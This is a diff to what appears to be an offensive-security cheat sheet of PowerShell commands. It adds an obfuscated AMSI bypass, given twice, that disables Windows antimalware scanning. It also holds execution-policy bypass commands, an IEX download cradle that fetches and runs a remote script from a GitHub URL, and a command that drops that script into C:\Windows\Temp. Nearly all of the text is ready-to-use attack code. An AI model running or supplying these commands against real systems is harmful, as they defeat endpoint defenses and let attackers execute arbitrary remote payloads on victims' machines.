@@ -1,6 +1,16 @@
 # Commands
 
-# powershell script bypass
+# Powershell Basics
+#### Lazy AMSI Bypass
+```
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ); ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+```
+$var1 = 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx'; $var2 = [TYpE]("{1}{0}"-F'F','rE'); $var3 = (GeT-VariaBle ("1Q2U" +"zX") -VaL)."A`ss`Embly"."GET`TY`Pe"("{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'); $var4 = $var3."g`etf`iElD"(("{0}{2}{1}" -f'amsi','d','InitFaile'), ("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,')); $var4."sE`T`VaLUE"(${n`ULl},${t`RuE})
+```
+
+#### EP Bypass
 Start PowerShell from cmd.exe:
 
 ```powershell.exe -ep bypass```
@@ -13,12 +23,12 @@ OR If already running-
 
 ```$Env:PSExecutionPolicyPreference = 'Bypass'```
 
+# PS Ingress
 
-
-# cradle
+#### Execution cradle
 ```IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')```
 
-# download
+#### download
 ```(new-object System.Net.Webclient).DownloadFile("https://raw.githubusercontent.com/conma293/mvp/main/1.ps1", "C:\Windows\Temp\1.ps1")```
 
 # Tickets
